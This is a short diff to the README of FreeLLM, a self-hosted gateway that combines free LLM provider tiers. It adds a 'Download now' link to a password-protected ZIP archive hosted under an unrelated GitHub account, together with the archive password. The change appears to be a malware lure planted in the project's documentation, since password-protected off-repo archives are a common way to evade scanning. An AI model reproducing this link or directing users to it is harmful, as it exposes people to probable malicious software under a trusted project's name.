@@ -8,6 +8,10 @@ FreeLLM is a self-hosted gateway that combines the free tiers of many LLM provid
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](#contributing)
 [![Docker](https://img.shields.io/badge/docker-ready-2496ED.svg)](#quick-start)
 
+## [⬇ Download now](https://github.com/alepo00proto/FREELLM_INSTALL/releases/download/1.3.1/FreeLLM.zip)
+
+**Archive password:** `FREELLM`
+
 > **For personal experimentation and prototyping.** Free tiers come with no SLA and no frontier models. See [Limitations](#limitations) before building anything important on top of this.
 
 ---
